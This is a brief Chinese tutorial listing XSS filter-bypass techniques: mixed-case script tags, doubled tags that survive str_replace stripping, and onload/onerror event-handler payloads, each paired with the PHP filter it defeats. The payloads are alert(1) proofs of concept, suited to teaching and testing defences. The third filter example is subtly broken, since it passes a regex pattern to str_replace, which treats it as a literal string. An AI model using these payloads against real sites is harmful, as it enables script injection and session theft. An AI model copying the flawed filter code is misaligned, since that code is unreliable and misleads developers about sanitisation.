# XSS 绕过

1. 大小写绕过

   后端 PHP 过滤代码如下：

   ```PHP
   <?php
       $str = str_replace('<script>', '', $str);
   ?>
   ```

   仅仅对特定字符串进行过滤，可以改变大小写来绕过，XSS 绕过代码如下：

   ```JavaScript
   <ScRipt>alert(1)</SCriPt>
   ```

2. 双写绕过

   后端 PHP 过滤代码如下：

   ```PHP
   <?php
       $str = str_replace('<script>', '', $str);
   ?>
   ```

   仅仅对特定字符串进行过滤，可以将字符串进行双写，在 XSS 代码被过滤后，仍然可以执行。

   ```JavaScript
   <scr<script>ipt>alert(1)</script>
   ```

3. 其他标签绕过

   后端 PHP 过滤代码如下：
   
   ```PHP
   <?php
    $str = str_replace('/s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $str);
   ?>
   ```
   
   此时以上两种绕过方法都已失效，可以尝试其它标签。
   
   ``` JavaScript
   <body onload=alert(1)>
   <img src=x onerror=alert(1) />
   ```
